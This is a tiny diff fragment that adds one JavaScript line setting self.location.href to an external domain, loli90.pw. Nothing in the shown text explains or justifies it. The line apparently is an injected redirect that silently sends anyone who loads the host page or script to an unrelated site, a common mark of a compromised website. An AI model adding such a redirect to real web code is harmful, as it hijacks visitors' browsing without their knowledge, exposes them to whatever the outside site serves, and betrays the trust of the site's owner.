@@ -1,0 +1,1 @@
+self.location.href="https://www.loli90.pw"
